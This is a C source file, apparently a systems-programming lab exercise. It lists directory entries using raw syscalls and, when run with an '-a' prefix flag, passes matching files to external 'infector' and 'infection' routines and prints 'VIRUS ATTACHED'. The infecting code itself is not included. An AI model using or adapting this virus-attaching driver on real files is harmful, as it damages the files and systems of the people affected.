#include "util.h"
#define SYS_GETDENTS 141
#define SYS_EXIT 1
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

#define O_RDONLY	     00
#define O_DIRECTORY	0200000


extern int system_call();
extern void infection();
extern void infector(char*);

struct linux_dirent {
  unsigned long  d_ino;
  int            d_off;
  unsigned short d_reclen;
  char           d_name[];
};

#define BUF_SIZE 8192

enum
  {
    DT_UNKNOWN = 0,
# define DT_UNKNOWN	DT_UNKNOWN
    DT_FIFO = 1,
# define DT_FIFO	DT_FIFO
    DT_CHR = 2,
# define DT_CHR		DT_CHR
    DT_DIR = 4,
# define DT_DIR		DT_DIR
    DT_BLK = 6,
# define DT_BLK		DT_BLK
    DT_REG = 8,
# define DT_REG		DT_REG
    DT_LNK = 10,
# define DT_LNK		DT_LNK
    DT_SOCK = 12,
# define DT_SOCK	DT_SOCK
    DT_WHT = 14
# define DT_WHT		DT_WHT
  };


int main (int argc , char* argv[], char* envp[])
{
  
  char buf[BUF_SIZE];
  int infection_mode = 0;
  char* prefix = 0;
  int i;


  for(i = 0; i < argc; i++){
    if(strncmp(argv[i], "-a", 2) == 0){
      prefix = argv[i] + 2;
      infection_mode = 1;
    }
  }
  int file_desc = system_call(SYS_OPEN, ".", O_RDONLY | O_DIRECTORY);

  if (file_desc == -1)
  {
    system_call(SYS_EXIT, 0x55);
  }

  int byte_read = system_call(SYS_GETDENTS, file_desc, buf, BUF_SIZE);

  if (byte_read == -1)
  {
    system_call(SYS_EXIT, 0x55);
  }

  long position;
  struct linux_dirent *d_point;
  for (position = 0; position < byte_read; position += d_point->d_reclen) 
  {
    d_point = (struct linux_dirent *) (buf + position);
    char d_type = *(buf + position + d_point->d_reclen - 1);
    char* type = ((d_type == DT_REG) ?  "regular" :
                    (d_type == DT_DIR) ?  "directory" :
                    (d_type == DT_FIFO) ? "FIFO" :
                    (d_type == DT_SOCK) ? "socket" :
                    (d_type == DT_LNK) ?  "symlink" :
                    (d_type == DT_BLK) ?  "block dev" :
                    (d_type == DT_CHR) ?  "char dev" : "???");

    if(prefix == 0 && infection_mode == 0)
    {
      system_call(SYS_WRITE, STDOUT, d_point->d_name, strlen(d_point->d_name));
      system_call(SYS_WRITE, STDOUT, "\t", 1);
      system_call(SYS_WRITE, STDOUT, type, strlen(type));
      system_call(SYS_WRITE, STDOUT, "\n", 1);

    } 
    else 
    {
      system_call(SYS_WRITE, STDOUT, d_point->d_name, strlen(d_point->d_name));

      if(strncmp(prefix, d_point->d_name, strlen(prefix)) == 0){
        infector(d_point->d_name);
        system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", strlen(" VIRUS ATTACHED\n"));
        infection();
      }
      else {
        system_call(SYS_WRITE, STDOUT, "\t", 1);
        system_call(SYS_WRITE, STDOUT, type, strlen(type));
        system_call(SYS_WRITE, STDOUT, "\n", 1);
      }
    }
  }
  return 0;
}
